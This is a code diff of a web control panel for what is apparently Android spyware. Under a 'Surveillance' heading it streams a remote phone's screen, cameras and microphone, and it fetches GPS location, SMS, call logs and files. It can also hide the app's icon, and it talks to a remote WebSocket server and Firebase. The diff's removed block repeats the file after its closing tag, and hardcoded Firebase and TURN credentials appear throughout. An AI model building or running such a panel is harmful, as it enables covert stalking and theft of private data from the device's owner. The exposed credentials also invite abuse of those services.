@@ -141,6 +141,11 @@
             background:#e8f0fe;
             color:#1976ff;
             font-weight:500;
+            cursor: pointer;
+        }
+        #status.offline{
+            background:#ffebee;
+            color:#c62828;
         }
         #content{
             flex:1;
@@ -369,6 +374,16 @@
             width:100%;
             margin-top:15px;
         }
+        .reconnect-btn{
+            background: #1976ff;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 5px 15px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
     </style>
 </head>
 <body>
@@ -378,7 +393,7 @@
 
     <div class="section">
         <div class="section-title">Surveillance</div>
-        <button onclick="toggleScreen()"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
+        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
 
         <!-- Click Picture panel -->
         <button onclick="toggleCameraPanel('click')"><span>📷</span> Click Picture</button>
@@ -431,11 +446,14 @@
 <div id="main">
     <div id="header">
         <div>Control Panel</div>
-        <div id="status">CONNECTING</div>
+        <div style="display: flex; align-items: center;">
+            <span id="status">CONNECTING</span>
+            <button class="reconnect-btn" onclick="connectWebSocket()">⟲ Reconnect</button>
+        </div>
     </div>
     <div id="content">
         <div id="main-panel">
-            Ready.
+            Ready. Click any button to send command.
         </div>
     </div>
 </div>
@@ -472,7 +490,8 @@
 
     // ---------- GLOBALS ----------
     const WS_URL = "wss://mirror-view.onrender.com";
-    let ws;
+    let ws = null;
+    let reconnectTimer = null;
 
     // WebRTC peer connections
     let screenPC = null;
@@ -505,6 +524,7 @@
     let recordedChunks = [];
 
     const panel = document.getElementById('main-panel');
+    const statusEl = document.getElementById('status');
 
     // ---------- ICE SERVERS ----------
     const ICE_SERVERS = [
@@ -886,7 +906,7 @@
     // ---------- COMMAND SENDING ----------
     function sendCommand(command, params = {}) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
-            alert('Not connected to WebSocket');
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect or check server.</div>`;
             return;
         }
         const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
@@ -898,6 +918,7 @@
             timestamp: Date.now()
         };
         ws.send(JSON.stringify(payload));
+        panel.innerHTML = `📤 Command sent: ${command}`;
     }
 
     // ---------- PLAIN TEXT / JSON HANDLERS ----------
@@ -1025,10 +1046,16 @@
     }
 
     function setStatus(s) {
-        const el = document.getElementById('status');
-        el.innerText = s;
-        el.style.background = s === 'ONLINE' ? '#e8f5e9' : '#ffebee';
-        el.style.color = s === 'ONLINE' ? '#2e7d32' : '#c62828';
+        statusEl.innerText = s;
+        if (s === 'ONLINE') {
+            statusEl.classList.remove('offline');
+            statusEl.style.background = '#e8f5e9';
+            statusEl.style.color = '#2e7d32';
+        } else {
+            statusEl.classList.add('offline');
+            statusEl.style.background = '#ffebee';
+            statusEl.style.color = '#c62828';
+        }
     }
 
     // ---------- CAMERA UI ----------
@@ -1334,18 +1361,22 @@
     }
 
     function showNotification(text) {
-        const status = document.getElementById('status');
-        const orig = status.innerText;
-        status.innerText = text;
-        setTimeout(() => { status.innerText = orig; }, 2000);
+        const orig = statusEl.innerText;
+        statusEl.innerText = text;
+        setTimeout(() => { statusEl.innerText = orig; }, 2000);
     }
 
     // ---------- WEBSOCKET CONNECTION ----------
-    function connect() {
+    function connectWebSocket() {
+        if (ws) {
+            ws.close();
+        }
+        setStatus('CONNECTING');
         ws = new WebSocket(WS_URL);
         ws.onopen = () => {
             console.log('WebSocket connected');
             setStatus('ONLINE');
+            panel.innerHTML = '✅ Connected to server. Ready.';
         };
         ws.onmessage = (e) => {
             const msg = e.data;
@@ -1361,12 +1392,14 @@
             }
         };
         ws.onclose = () => {
-            console.log('WebSocket closed, reconnecting...');
+            console.log('WebSocket closed');
             setStatus('OFFLINE');
-            setTimeout(connect, 3000);
+            panel.innerHTML = '🔌 WebSocket disconnected. Click reconnect.';
+            ws = null;
         };
         ws.onerror = (err) => {
             console.error('WebSocket error:', err);
+            setStatus('ERROR');
         };
     }
 
@@ -1388,1369 +1421,13 @@
     window.navigateUp = navigateUp;
     window.updateSelected = updateSelected;
     window.downloadSelected = downloadSelected;
+    window.connectWebSocket = connectWebSocket;
+
+    // Additional binding for screen share button (to avoid inline onclick conflict)
+    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
     // ---------- START ----------
-    connect();
-</script>
-</body>
-</html>            text-transform:uppercase;
-            letter-spacing:0.5px;
-            margin-bottom:12px;
-        }
-        button{
-            width:100%;
-            padding:10px 12px;
-            margin:4px 0;
-            background:white;
-            color:#1a2634;
-            border:1px solid #d0d9e2;
-            border-radius:8px;
-            font-size:14px;
-            text-align:left;
-            cursor:pointer;
-            transition:0.2s;
-            display:flex;
-            align-items:center;
-            gap:8px;
-        }
-        button:hover{
-            background:#1976ff;
-            color:white;
-            border-color:#1976ff;
-        }
-        /* camera control panels */
-        .camera-panel {
-            background: #f0f2f5;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 8px 0;
-            display: none;
-        }
-        .camera-panel.show {
-            display: block;
-        }
-        .camera-option {
-            margin: 8px 0;
-        }
-        .camera-option label {
-            margin-right: 15px;
-            color: #1a2634;
-        }
-        .capture-btn, .live-btn {
-            background: #1976ff;
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 8px;
-        }
-        .capture-btn:hover, .live-btn:hover {
-            background: #0d5bca;
-        }
-        /* live stream controls */
-        .live-controls {
-            display: flex;
-            gap: 8px;
-            margin-top: 10px;
-            flex-wrap: wrap;
-        }
-        .live-controls button {
-            flex: 1;
-            background: #1976ff;
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            width: auto;
-        }
-        .live-controls button.stop {
-            background: #d32f2f;
-        }
-        .live-controls button.stop:hover {
-            background: #b71c1c;
-        }
-        .live-controls button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        #main{
-            flex:1;
-            display:flex;
-            flex-direction:column;
-            min-width:0;
-            background:#f5f7fa;
-        }
-        #header{
-            height:60px;
-            background:white;
-            border-bottom:1px solid #e0e4e8;
-            display:flex;
-            align-items:center;
-            justify-content:space-between;
-            padding:0 25px;
-            font-weight:600;
-            color:#1a2634;
-        }
-        #status{
-            padding:6px 16px;
-            border-radius:30px;
-            background:#e8f0fe;
-            color:#1976ff;
-            font-weight:500;
-        }
-        #content{
-            flex:1;
-            padding:20px;
-            overflow:auto;
-        }
-        #main-panel{
-            background:white;
-            border-radius:12px;
-            box-shadow:0 2px 8px rgba(0,0,0,0.05);
-            padding:20px;
-            min-height:100%;
-            position:relative;
-        }
-        #map{
-            height:400px;
-            border-radius:10px;
-        }
-        .map-info {
-            position: absolute;
-            top: 30px;
-            left: 30px;
-            background: rgba(255,255,255,0.95);
-            padding: 8px 12px;
-            border-radius: 8px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            font-size: 13px;
-            color: #1a2634;
-            z-index: 1000;
-            pointer-events: none;
-            border-left: 4px solid #1976ff;
-        }
-        .map-info div {
-            margin: 2px 0;
-        }
-        .map-info .coord {
-            font-weight: 600;
-        }
-        .map-info .addr {
-            color: #2c3e50;
-            font-style: italic;
-        }
-        table{
-            width:100%;
-            border-collapse:collapse;
-            font-size:14px;
-        }
-        th{
-            background:#f8fafd;
-            color:#1a2634;
-            font-weight:600;
-            padding:12px 10px;
-            text-align:left;
-            border-bottom:2px solid #e0e4e8;
-        }
-        td{
-            padding:10px;
-            border-bottom:1px solid #eef2f5;
-            color:#2c3e50;
-            word-break:break-word;
-        }
-        tr:hover{
-            background:#f5f9ff;
-        }
-        .file-manager {
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-        }
-        .file-toolbar-sticky {
-            position: sticky;
-            top: 0;
-            background: white;
-            z-index: 10;
-            padding-bottom: 10px;
-            margin-bottom: 10px;
-            border-bottom: 1px solid #eef2f5;
-        }
-        .file-toolbar {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .file-toolbar button{
-            width:auto;
-            padding:6px 12px;
-            background:white;
-            border:1px solid #d0d9e2;
-            border-radius:6px;
-            cursor:pointer;
-            font-size:13px;
-            margin:0;
-        }
-        .file-toolbar button:hover{
-            background:#1976ff;
-            color:white;
-        }
-        .file-path{
-            background:#f0f2f5;
-            padding:6px 12px;
-            border-radius:20px;
-            font-size:13px;
-            color:#2c3e50;
-            flex:1;
-        }
-        .file-panes {
-            display: flex;
-            gap: 20px;
-            flex: 1;
-            overflow: hidden;
-            min-height: 300px;
-        }
-        .folder-pane {
-            flex: 1;
-            background: #fafbfc;
-            border-radius: 8px;
-            padding: 10px;
-            overflow-y: auto;
-            border: 1px solid #eef2f5;
-        }
-        .file-pane {
-            flex: 1;
-            background: #fafbfc;
-            border-radius: 8px;
-            padding: 10px;
-            overflow-y: auto;
-            border: 1px solid #eef2f5;
-        }
-        .pane-title {
-            font-size: 12px;
-            font-weight: 600;
-            color: #7b8a9b;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-        }
-        .folder-item, .file-item {
-            display: flex;
-            align-items: center;
-            padding: 6px 8px;
-            border-radius: 6px;
-            cursor: pointer;
-            gap: 8px;
-            margin-bottom: 2px;
-        }
-        .folder-item:hover {
-            background: #e3f2fd;
-        }
-        .file-item {
-            cursor: default;
-        }
-        .file-item:hover {
-            background: #f5f5f5;
-        }
-        .folder-icon, .file-icon {
-            width: 20px;
-            text-align: center;
-        }
-        .folder-name, .file-name {
-            flex: 1;
-            font-size: 14px;
-        }
-        .folder-name {
-            color: #1976ff;
-        }
-        .file-checkbox {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-            margin-right: 8px;
-        }
-        .file-size {
-            color: #7b8a9b;
-            font-size: 12px;
-            margin-left: 10px;
-        }
-        .download-selected{
-            margin-top:15px;
-            text-align:right;
-            position: sticky;
-            bottom: 0;
-            background: white;
-            padding: 10px 0 0 0;
-            border-top: 1px solid #eef2f5;
-        }
-        .download-selected button{
-            width:auto;
-            padding:8px 16px;
-            background:#1976ff;
-            color:white;
-            border:none;
-            border-radius:6px;
-            cursor:pointer;
-            font-weight:500;
-        }
-        .download-selected button:hover{
-            background:#0d5bca;
-        }
-        .pagination{
-            margin-top:20px;
-            display:flex;
-            gap:8px;
-            justify-content:center;
-        }
-        .page-btn{
-            padding:6px 12px;
-            border:1px solid #d0d9e2;
-            background:white;
-            border-radius:6px;
-            cursor:pointer;
-            color:#1a2634;
-        }
-        .page-btn:hover{
-            background:#1976ff;
-            color:white;
-            border-color:#1976ff;
-        }
-        img, video{
-            max-width:100%;
-            max-height:70vh;
-            border-radius:8px;
-            display:block;
-            margin:0 auto;
-        }
-        audio{
-            width:100%;
-            margin-top:15px;
-        }
-    </style>
-</head>
-<body>
-
-<div id="sidebar">
-    <div class="logo">SystemSync</div>
-
-    <div class="section">
-        <div class="section-title">Surveillance</div>
-        <button onclick="toggleScreen()"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
-
-        <!-- Click Picture panel -->
-        <button onclick="toggleCameraPanel('click')"><span>📷</span> Click Picture</button>
-        <div id="clickCameraPanel" class="camera-panel">
-            <div class="camera-option">
-                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>
-                <label><input type="radio" name="clickCameraSelect" value="back"> Rear</label>
-            </div>
-            <div class="camera-option">
-                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
-            </div>
-            <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
-        </div>
-
-        <!-- See Live panel -->
-        <button onclick="toggleCameraPanel('live')"><span>📹</span> See Live</button>
-        <div id="liveCameraPanel" class="camera-panel">
-            <div class="camera-option">
-                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
-                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
-            </div>
-            <div class="camera-option">
-                <label><input type="checkbox" id="liveFlashCheckbox"> Use flash</label>
-                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
-            </div>
-            <button class="live-btn" onclick="startLiveStream()">See Live</button>
-        </div>
-
-        <!-- Live Audio button -->
-        <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
-        <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn">⏹ Stop Live Audio</button>
-
-        <button onclick="sendCommand('getLocation')"><span>📍</span> GPS Location</button>
-    </div>
-
-    <div class="section">
-        <div class="section-title">Data</div>
-        <button onclick="sendCommand('ls root')"><span>📂</span> File Manager</button>
-        <button onclick="sendCommand('getSMS inbox')"><span>💬</span> SMS Logs</button>
-        <button onclick="sendCommand('getCallLogs')"><span>📞</span> Call Logs</button>
-    </div>
-
-    <div class="section">
-        <div class="section-title">Control</div>
-        <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
-        <button onclick="sendCommand('vibrate 1000')"><span>📳</span> Vibrate (1s)</button>
-    </div>
-</div>
-
-<div id="main">
-    <div id="header">
-        <div>Control Panel</div>
-        <div id="status">CONNECTING</div>
-    </div>
-    <div id="content">
-        <div id="main-panel">
-            Ready.
-        </div>
-    </div>
-</div>
-
-<!-- Firebase SDK (modular) -->
-<script type="importmap">
-    {
-        "imports": {
-            "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
-            "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
-        }
-    }
-</script>
-
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script type="module">
-    // ---------- FIREBASE INIT ----------
-    import { initializeApp } from "firebase/app";
-    import { getFirestore, doc, setDoc, updateDoc, collection, addDoc, onSnapshot, getDoc } from "firebase/firestore";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
-        authDomain: "webviewiot.firebaseapp.com",
-        projectId: "webviewiot",
-        storageBucket: "webviewiot.firebasestorage.app",
-        messagingSenderId: "634777347775",
-        appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
-        measurementId: "G-2KW4EJYTRB"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-    console.log("Firebase initialized");
-
-    // ---------- GLOBALS ----------
-    const WS_URL = "wss://mirror-view.onrender.com";
-    let ws;
-
-    // WebRTC peer connections
-    let screenPC = null;
-    let cameraPC = null;
-    let audioPC = null;
-
-    // Separate room IDs for each stream type (for Firebase signaling)
-    let screenRoomId = null;
-    let cameraRoomId = null;
-    let audioRoomId = null;
-
-    // Firestore listeners
-    let screenRoomUnsub = null;
-    let cameraRoomUnsub = null;
-    let audioRoomUnsub = null;
-    let candidatesUnsub = null;
-
-    // UI state
-    let mapInstance = null;
-    let currentData = [];
-    let currentPage = 0;
-    let dataType = null;
-    let currentPath = "root";
-    let selectedFiles = [];
-    let screenActive = false;
-    let iconHidden = false;
-
-    // Live camera recording state
-    let mediaRecorder = null;
-    let recordedChunks = [];
-
-    const panel = document.getElementById('main-panel');
-
-    // ---------- ICE SERVERS ----------
-    const ICE_SERVERS = [
-        { urls: "stun:stun.relay.metered.ca:80" },
-        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
-    ];
-
-    // ---------- FIREBASE SIGNALING HELPERS ----------
-    async function createWebRTCRoom(offerSdp, streamType) {
-        const roomId = 'room_' + Date.now() + '_' + Math.random().toString(36).substring(7);
-        const roomData = {
-            caller: 'web-client',
-            callee: 'android-device',
-            status: 'waiting',
-            type: streamType,
-            createdAt: new Date(),
-            offer: {
-                type: 'offer',
-                sdp: offerSdp
-            }
-        };
-        try {
-            await setDoc(doc(db, "rooms", roomId), roomData);
-            console.log(`Room created (${streamType}):`, roomId);
-        } catch (e) {
-            console.error('Failed to create room:', e);
-            showNotification('Firebase error: cannot create room');
-            return null;
-        }
-        // Store room ID per type
-        if (streamType === 'screen') screenRoomId = roomId;
-        else if (streamType === 'camera') cameraRoomId = roomId;
-        else if (streamType === 'audio') audioRoomId = roomId;
-
-        listenForRoomAnswer(roomId, streamType);
-        return roomId;
-    }
-
-    function listenForRoomAnswer(roomId, streamType) {
-        let unsubscribe;
-        if (streamType === 'screen') {
-            if (screenRoomUnsub) screenRoomUnsub();
-            unsubscribe = onSnapshot(doc(db, "rooms", roomId), (docSnap) => {
-                if (!docSnap.exists()) return;
-                const data = docSnap.data();
-                const pc = getPCForType(streamType);
-                if (data.answer && data.answer.sdp && pc) {
-                    console.log('Answer received for', streamType);
-                    const answer = new RTCSessionDescription({
-                        type: 'answer',
-                        sdp: data.answer.sdp
-                    });
-                    pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote desc:', e));
-                }
-                if (data.status === 'ended') {
-                    console.log('Stream ended by peer:', streamType);
-                    if (pc) pc.close();
-                    setPCForType(streamType, null);
-                    if (streamType === 'screen') {
-                        screenActive = false;
-                        document.getElementById('screenBtn').innerText = 'Start Screen';
-                    }
-                    panel.innerHTML = 'Ready.';
-                }
-            });
-            screenRoomUnsub = unsubscribe;
-        } else if (streamType === 'camera') {
-            if (cameraRoomUnsub) cameraRoomUnsub();
-            unsubscribe = onSnapshot(doc(db, "rooms", roomId), (docSnap) => {
-                if (!docSnap.exists()) return;
-                const data = docSnap.data();
-                const pc = getPCForType(streamType);
-                if (data.answer && data.answer.sdp && pc) {
-                    console.log('Answer received for', streamType);
-                    const answer = new RTCSessionDescription({
-                        type: 'answer',
-                        sdp: data.answer.sdp
-                    });
-                    pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote desc:', e));
-                }
-                if (data.status === 'ended') {
-                    console.log('Stream ended by peer:', streamType);
-                    if (pc) pc.close();
-                    setPCForType(streamType, null);
-                    panel.innerHTML = 'Ready.';
-                }
-            });
-            cameraRoomUnsub = unsubscribe;
-        } else if (streamType === 'audio') {
-            if (audioRoomUnsub) audioRoomUnsub();
-            unsubscribe = onSnapshot(doc(db, "rooms", roomId), (docSnap) => {
-                if (!docSnap.exists()) return;
-                const data = docSnap.data();
-                const pc = getPCForType(streamType);
-                if (data.answer && data.answer.sdp && pc) {
-                    console.log('Answer received for', streamType);
-                    const answer = new RTCSessionDescription({
-                        type: 'answer',
-                        sdp: data.answer.sdp
-                    });
-                    pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote desc:', e));
-                }
-                if (data.status === 'ended') {
-                    console.log('Stream ended by peer:', streamType);
-                    if (pc) pc.close();
-                    setPCForType(streamType, null);
-                    document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
-                    document.getElementById('stopLiveAudioBtn').style.display = 'none';
-                    panel.innerHTML = 'Ready.';
-                }
-            });
-            audioRoomUnsub = unsubscribe;
-        }
-    }
-
-    function listenForRemoteCandidates(roomId, remoteUser, streamType) {
-        if (candidatesUnsub) candidatesUnsub();
-        const candidatesRef = collection(db, "rooms", roomId, "candidates");
-        candidatesUnsub = onSnapshot(candidatesRef.where("sender", "==", remoteUser), (snapshot) => {
-            snapshot.docChanges().forEach((change) => {
-                if (change.type === 'added') {
-                    const data = change.doc.data();
-                    const candidate = new RTCIceCandidate({
-                        candidate: data.candidate,
-                        sdpMid: data.sdpMid,
-                        sdpMLineIndex: data.sdpMLineIndex
-                    });
-                    const pc = getPCForType(streamType);
-                    if (pc) pc.addIceCandidate(candidate);
-                }
-            });
-        });
-    }
-
-    async function sendIceCandidateViaFirebase(roomId, candidate, streamType) {
-        if (!roomId) return;
-        const candidateData = {
-            candidate: candidate.candidate,
-            sdpMid: candidate.sdpMid,
-            sdpMLineIndex: candidate.sdpMLineIndex,
-            sender: 'web-client',
-            timestamp: new Date()
-        };
-        try {
-            await addDoc(collection(db, "rooms", roomId, "candidates"), candidateData);
-        } catch (e) {
-            console.error('Failed to send ICE candidate:', e);
-        }
-    }
-
-    // Helper to get the correct peer connection based on stream type
-    function getPCForType(type) {
-        if (type === 'screen') return screenPC;
-        if (type === 'camera') return cameraPC;
-        if (type === 'audio') return audioPC;
-        return null;
-    }
-    function setPCForType(type, pc) {
-        if (type === 'screen') screenPC = pc;
-        else if (type === 'camera') cameraPC = pc;
-        else if (type === 'audio') audioPC = pc;
-    }
-
-    // ---------- PEER CONNECTION CREATORS ----------
-    function createPeerConnection(streamType) {
-        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
-        pc.ontrack = (e) => {
-            if (streamType === 'screen') {
-                panel.innerHTML = '<video autoplay playsinline style="width:100%; height:100%;"></video>';
-                document.querySelector('video').srcObject = e.streams[0];
-            } else if (streamType === 'camera') {
-                const video = document.getElementById('liveCamVideo');
-                if (video) video.srcObject = e.streams[0];
-            } else if (streamType === 'audio') {
-                const audioEl = document.getElementById('liveAudio');
-                if (audioEl) {
-                    audioEl.srcObject = e.streams[0];
-                    audioEl.play().catch(err => console.log('Autoplay prevented:', err));
-                }
-            }
-        };
-        pc.onicecandidate = (e) => {
-            if (e.candidate) {
-                let roomId = null;
-                if (streamType === 'screen') roomId = screenRoomId;
-                else if (streamType === 'camera') roomId = cameraRoomId;
-                else if (streamType === 'audio') roomId = audioRoomId;
-                if (roomId) {
-                    sendIceCandidateViaFirebase(roomId, e.candidate, streamType);
-                }
-            }
-        };
-        pc.oniceconnectionstatechange = () => {
-            console.log(`${streamType} PC ICE state:`, pc.iceConnectionState);
-        };
-        return pc;
-    }
-
-    // ---------- SCREEN SHARE ----------
-    async function toggleScreen() {
-        if (screenActive) {
-            // Stop screen share
-            if (screenPC) screenPC.close();
-            screenPC = null;
-            if (screenRoomId) {
-                try {
-                    await updateDoc(doc(db, "rooms", screenRoomId), { status: "ended" });
-                } catch (e) { console.error(e); }
-                screenRoomId = null;
-            }
-            if (screenRoomUnsub) screenRoomUnsub();
-            document.getElementById('screenBtn').innerText = 'Start Screen';
-            screenActive = false;
-            panel.innerHTML = 'Ready.';
-        } else {
-            // Start screen share
-            panel.innerHTML = '<h2>Starting screen share...</h2>';
-            screenPC = createPeerConnection('screen');
-            try {
-                const offer = await screenPC.createOffer();
-                await screenPC.setLocalDescription(offer);
-                const roomId = await createWebRTCRoom(offer.sdp, 'screen');
-                if (!roomId) return;
-                screenRoomId = roomId;
-                // Notify Android via WebSocket to join the room
-                sendCommand('JOIN_ROOM', { roomId: roomId, type: 'screen' });
-                document.getElementById('screenBtn').innerText = 'Stop Screen';
-                screenActive = true;
-            } catch (e) {
-                console.error('Screen share initiation failed:', e);
-                showNotification('Failed to start screen share');
-                screenPC = null;
-            }
-        }
-    }
-
-    // ---------- LIVE CAMERA ----------
-    async function startLiveStream() {
-        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
-        const useFlash = document.getElementById('liveFlashCheckbox').checked;
-        const useMic = document.getElementById('liveMicCheckbox').checked;
-
-        panel.innerHTML = `
-            <video id="liveCamVideo" autoplay playsinline></video>
-            <div class="live-controls">
-                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
-                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
-                <button class="stop" onclick="stopLiveStream()">Stop</button>
-            </div>
-        `;
-
-        cameraPC = createPeerConnection('camera');
-        try {
-            const offer = await cameraPC.createOffer();
-            await cameraPC.setLocalDescription(offer);
-            const roomId = await createWebRTCRoom(offer.sdp, 'camera');
-            if (!roomId) return;
-            cameraRoomId = roomId;
-            sendCommand('START_CAMERA_STREAM', { camera, flash: useFlash, mic: useMic, roomId });
-        } catch (e) {
-            console.error('Live camera start failed:', e);
-            showNotification('Failed to start camera stream');
-            cameraPC = null;
-            panel.innerHTML = 'Ready.';
-        }
-    }
-
-    function stopLiveStream() {
-        if (cameraPC) {
-            cameraPC.close();
-            cameraPC = null;
-        }
-        if (cameraRoomId) {
-            updateDoc(doc(db, "rooms", cameraRoomId), { status: "ended" }).catch(console.error);
-            cameraRoomId = null;
-        }
-        if (cameraRoomUnsub) cameraRoomUnsub();
-        if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-        mediaRecorder = null;
-        sendCommand('STOP_CAMERA_STREAM', {});
-        panel.innerHTML = 'Ready.';
-    }
-
-    // ---------- LIVE AUDIO ----------
-    async function toggleLiveAudio() {
-        if (audioPC) {
-            stopLiveAudio();
-        } else {
-            startLiveAudio();
-        }
-    }
-
-    async function startLiveAudio() {
-        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
-        audioPC = createPeerConnection('audio');
-        try {
-            const offer = await audioPC.createOffer();
-            await audioPC.setLocalDescription(offer);
-            const roomId = await createWebRTCRoom(offer.sdp, 'audio');
-            if (!roomId) return;
-            audioRoomId = roomId;
-            sendCommand('START_LIVE_AUDIO', { mic: true, roomId });
-            document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
-            document.getElementById('stopLiveAudioBtn').style.display = 'block';
-        } catch (e) {
-            console.error('Live audio start failed:', e);
-            showNotification('Failed to start audio stream');
-            audioPC = null;
-            panel.innerHTML = 'Ready.';
-        }
-    }
-
-    function stopLiveAudio() {
-        if (audioPC) {
-            audioPC.close();
-            audioPC = null;
-        }
-        if (audioRoomId) {
-            updateDoc(doc(db, "rooms", audioRoomId), { status: "ended" }).catch(console.error);
-            audioRoomId = null;
-        }
-        if (audioRoomUnsub) audioRoomUnsub();
-        sendCommand('STOP_LIVE_AUDIO', {});
-        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
-        document.getElementById('stopLiveAudioBtn').style.display = 'none';
-        panel.innerHTML = 'Ready.';
-    }
-
-    // ---------- JOIN ROOM (when Android creates room) ----------
-    async function joinFirebaseRoom(roomId) {
-        const roomRef = doc(db, "rooms", roomId);
-        const roomSnap = await getDoc(roomRef);
-        if (!roomSnap.exists()) {
-            console.error('Room not found');
-            return;
-        }
-        const data = roomSnap.data();
-        const streamType = data.type; // "screen", "camera", "audio"
-        const offerSdp = data.offer.sdp;
-
-        // Create appropriate peer connection
-        let pc;
-        if (streamType === 'screen') {
-            if (!screenPC) screenPC = createPeerConnection('screen');
-            pc = screenPC;
-        } else if (streamType === 'camera') {
-            if (!cameraPC) cameraPC = createPeerConnection('camera');
-            pc = cameraPC;
-        } else if (streamType === 'audio') {
-            if (!audioPC) audioPC = createPeerConnection('audio');
-            pc = audioPC;
-        }
-        if (!pc) return;
-
-        const offer = new RTCSessionDescription({ type: 'offer', sdp: offerSdp });
-        await pc.setRemoteDescription(offer);
-        const answer = await pc.createAnswer();
-        await pc.setLocalDescription(answer);
-
-        // Send answer to Firebase
-        await updateDoc(roomRef, {
-            answer: {
-                type: 'answer',
-                sdp: answer.sdp,
-                sender: 'web-client'
-            }
-        });
-
-        // Listen for remote ICE candidates
-        listenForRemoteCandidates(roomId, 'android-device', streamType);
-        if (streamType === 'screen') screenRoomId = roomId;
-        else if (streamType === 'camera') cameraRoomId = roomId;
-        else if (streamType === 'audio') audioRoomId = roomId;
-    }
-
-    // ---------- COMMAND SENDING ----------
-    function sendCommand(command, params = {}) {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            alert('Not connected to WebSocket');
-            return;
-        }
-        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-        const payload = {
-            type: 'COMMAND',
-            command: command,
-            requestId: requestId,
-            params: params,
-            timestamp: Date.now()
-        };
-        ws.send(JSON.stringify(payload));
-    }
-
-    // ---------- PLAIN TEXT / JSON HANDLERS ----------
-    function handleJSON(json) {
-        console.log('handleJSON:', json.type, json);
-        switch (json.type) {
-            case 'SMS_DATA':
-                dataType = 'sms';
-                currentData = json.data;
-                renderTable();
-                break;
-            case 'CALL_LOGS':
-                dataType = 'call';
-                currentData = json.data;
-                renderTable();
-                break;
-            case 'FILE_LIST':
-                dataType = 'file';
-                currentData = json.data;
-                renderFiles();
-                break;
-            case 'LOCATION_UPDATE':
-                renderMap(json.data);
-                break;
-            case 'CAMERA_IMAGE':
-                displayCapturedImage(json.data);
-                break;
-            case 'AUDIO_RECORDING':
-                showAudio(json.data);
-                break;
-            case 'ERROR':
-                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
-                break;
-            case 'DEVICE_STATUS':
-                setStatus(json.status);
-                break;
-            case 'APP_HIDDEN':
-                iconHidden = true;
-                document.getElementById('iconBtn').innerText = 'Show Icon';
-                showNotification('App icon hidden');
-                break;
-            case 'APP_SHOWN':
-                iconHidden = false;
-                document.getElementById('iconBtn').innerText = 'Hide Icon';
-                showNotification('App icon shown');
-                break;
-            case 'SCREEN_SHARE_STARTED':
-                screenActive = true;
-                document.getElementById('screenBtn').innerText = 'Stop Screen';
-                showNotification('Screen share started');
-                break;
-            case 'SCREEN_SHARE_STOPPED':
-                screenActive = false;
-                document.getElementById('screenBtn').innerText = 'Start Screen';
-                if (screenPC) { screenPC.close(); screenPC = null; }
-                showNotification('Screen share stopped');
-                break;
-            case 'ROOM_CREATED':
-                // Android created a room, join it
-                if (json.roomId) joinFirebaseRoom(json.roomId);
-                break;
-            default:
-                console.log('Unhandled JSON type:', json.type);
-        }
-    }
-
-    function handlePlainText(msg) {
-        if (msg.startsWith("STATUS:")) {
